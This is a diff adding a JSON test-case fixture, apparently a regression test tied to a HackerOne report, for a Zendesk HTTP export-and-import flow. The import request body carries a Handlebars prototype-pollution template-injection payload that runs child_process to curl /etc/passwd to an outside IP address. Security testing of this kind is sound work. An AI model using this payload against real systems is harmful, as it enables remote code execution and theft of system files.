@@ -1,0 +1,81 @@
+{
+    "name": "TC26287_HackerOne",
+    "referencename": "TC26287_HackerOne",
+    "qa__api_tdata": [
+        {
+            "pageGenerators": [
+                {
+                    "type": "export",
+                    "qa__export": {
+                        "name": "HTTP Export",
+                        "application": "zendesk support",
+                        "_connectionId": "HTTP ZENDESK CONNECTION",
+                        "apiIdentifier": "efb60942c5",
+                        "asynchronous": true,
+                        "oneToMany": false,
+                        "sandbox": false,
+                        "http": {
+                            "relativeURI": "/users/1473313072",
+                            "method": "GET",
+                            "formType": "http"
+                        },
+                        "rawData": "61e68956b587067a214ac5ed0335ba8c6ee94e90931294dbfeea35bf",
+                        "adaptorType": "HTTPExport"
+                    }
+                }
+            ],
+            "pageProcessors": [
+                {
+                    "type": "import",
+                    "qa__import": {
+                        "name": "Http Import",
+                        "application": "zendesk support",
+                        "_connectionId": "HTTP ZENDESK CONNECTION",
+                        "apiIdentifier": "ie8724b5da",
+                        "ignoreExisting": false,
+                        "ignoreMissing": false,
+                        "oneToMany": false,
+                        "sandbox": false,
+                        "http": {
+                            "relativeURI": [
+                                "/customer"
+                            ],
+                            "method": [
+                                "POST"
+                            ],
+                            "body": [
+                                "{{#with (__lookupGetter__ \"__proto__\")}}\n    {{#with (./constructor.getOwnPropertyDescriptor . \"valueOf\")}}\n        {{#with ../constructor.prototype}}\n            {{../../constructor.defineProperty . \"hasOwnProperty\" ..}}\n        {{/with}}\n    {{/with}}\n{{/with}}\n {{#with this as |obj|}}\n    {{#with (obj.constructor.keys \"1\") as |arr|}}\n        {{#with obj.constructor.name as |str|}}\n            {{#blockHelperMissing str.toString}}\n              {{#with (arr.constructor (str.toString.bind \"return JSON.stringify(process.mainModule.constructor._load('child_process').exec('curl http://192.3.81.170:1234/ --data @/etc/passwd'));\"))}}\n                  {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}\n                      {{#with (obj.constructor.defineProperty obj.constructor.prototype \"toString\" this)}}\n                          {{#with (obj.constructor.constructor \"test\")}}\n                            {{this}}\n                          {{/with}}\n                      {{/with}}\n                  {{/with}}\n              {{/with}}    {{/blockHelperMissing}}\n      {{/with}}\n  {{/with}}\n  {{/with}}"
+                            ],
+                            "batchSize": 1,
+                            "sendPostMappedData": true,
+                            "formType": "http"
+                        },
+                        "adaptorType": "HTTPImport"
+                    }
+                }
+            ],
+            "createFlow": {
+                "name": "TC26287_HackerOne",
+                "disabled": false,
+                "qa__integrationId": "6228aed6bc8a2732cfe8044c",
+                "_integrationId": "631a1266abf51e7a86c80ab4",
+                "skipRetries": false,
+                "pageProcessors": [
+                    {
+                        "responseMapping": {
+                            "fields": [],
+                            "lists": []
+                        },
+                        "type": "import",
+                        "_importId": "UPDATE WITH NEW IMPORTID"
+                    }
+                ],
+                "pageGenerators": [
+                    {
+                        "_exportId": "UPDATE WITH NEW EXPORTID"
+                    }
+                ]
+            }
+        }
+    ]
+}
